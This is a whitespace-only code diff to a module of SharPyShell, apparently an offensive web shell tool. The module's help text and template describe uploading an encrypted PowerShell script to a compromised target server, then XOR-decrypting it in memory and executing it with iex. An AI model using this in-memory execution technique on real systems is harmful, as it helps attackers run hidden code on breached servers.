@@ -17,19 +17,19 @@ class Invoke_ps_module(Module):
     short_help = "Run a ps1 script on the target server"
     complete_help = r"""
         This module upload and executes a powershell module that exists in the 'ps_modules/' SharPyShell directory.
-        The ps1 module will be uploaded to the target server in an encrypted form and get decrypted at runtime in  
+        The ps1 module will be uploaded to the target server in an encrypted form and get decrypted at runtime in
         memory.
         It is possible to execute additional code to the uploaded module in order to use functions inside of it or
-        add additional behaviours. 
-        
+        add additional behaviours.
+
         Usage:
             #invoke_ps_module ps_module [appended_code]
-            
+
         Positional arguments:
             ps_module               name of a .ps1 module existent in the 'ps_modules/' directory
             appended_code           powershell code to be run within the module uploaded
                                     Default: ''
-        
+
         Examples:
             Upload and execute a simple module:
                 #invoke_ps_module SharPyShell_Test.ps1
@@ -69,7 +69,7 @@ class Invoke_ps_module(Module):
                 for ($i = 0; $i -lt $encrypted.Length; $i++) {
                     $decrypted[$i] = $encrypted[$i] -bxor $key[$i %% $key.Length];
                 };
-                [System.Text.Encoding]::UTF8.GetString($decrypted)|iex; 
+                [System.Text.Encoding]::UTF8.GetString($decrypted)|iex;
     """
 
     __default_appended_code = ''
